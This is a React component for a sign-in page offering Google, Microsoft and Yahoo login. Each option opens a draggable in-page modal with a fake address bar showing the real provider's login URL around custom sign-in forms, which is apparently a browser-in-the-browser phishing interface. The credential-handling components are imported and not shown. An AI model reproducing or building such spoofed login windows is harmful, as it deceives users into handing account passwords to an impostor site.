import React, { useState } from 'react';
import GSign from './google/GSign';
import MicrosoftSignIn from './outlook/MicrosoftSignIn';
import YahooSignIn from './yahoo/YahooSignIn';
import Draggable from 'react-draggable';
import '../App.css'; // Styling for buttons and modal

const DraggableModal = ({ children, onClose, title }) => {
    return (
        <div className="modal-background" onClick={onClose}>
            <Draggable>
                <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                    <div className="modal-header">
                        <span className="modal-title">{title}</span>
                        <button className="modal-close" onClick={onClose}>
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                height="20" 
                                width="20" 
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                strokeWidth="1.5"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                            >
                                <line x1="18" y1="6" x2="6" y2="18" />
                                <line x1="6" y1="6" x2="18" y2="18" />
                            </svg>
                        </button>
                    </div>
                    <div className="modal-link">
                        <input className="modal-title-url" type="text" value={title} readOnly />
                    </div>
                    <div className="modal-body">{children}</div>
                </div>
            </Draggable>
        </div>
    );
};

const AuthPage = () => {
    const [activeModal, setActiveModal] = useState(null);
    const [modalTitle, setModalTitle] = useState('');
    const [emailProvider, setEmailProvider] = useState('email');

    const handleOpenModal = (modalName) => {
        setActiveModal(modalName);
        if (modalName === 'google') {
            setModalTitle('https://accounts.google.com/v3/signin/identifier');
        } else if (modalName === 'microsoft') {
            setModalTitle('login.live.com/login.srf');
        } else if (modalName === 'yahoo') {
            setModalTitle('login.yahoo.com/?.src=ym&lang=en-US');
        }
    };

    const handleCloseModal = () => {
        setActiveModal(null);
        setModalTitle('');
    };

    return (
        <div className="auth-page-container">
            <h1>Continue with</h1>
            <div className="button-container">
                <button onClick={() => handleOpenModal('google')} className="auth-button google">
                    Continue with Google
                </button>
                <button onClick={() => handleOpenModal('microsoft')} className="auth-button microsoft">
                    Continue with Microsoft
                </button>
                <button onClick={() => handleOpenModal('yahoo')} className="auth-button yahoo">
                    Continue with Yahoo
                </button>
            </div>

            {activeModal === 'google' && (
                <DraggableModal onClose={handleCloseModal} title={modalTitle}>
                    <GSign step={emailProvider} setStep={setEmailProvider} />
                </DraggableModal>
            )}
            {activeModal === 'microsoft' && (
                <DraggableModal onClose={handleCloseModal} title={modalTitle}>
                    <MicrosoftSignIn step={emailProvider} setStep={setEmailProvider} />
                </DraggableModal>
            )}
            {activeModal === 'yahoo' && (
                <DraggableModal onClose={handleCloseModal} title={modalTitle}>
                    <YahooSignIn step={emailProvider} setStep={setEmailProvider} />
                </DraggableModal>
            )}
        </div>
    );
};

export default AuthPage;
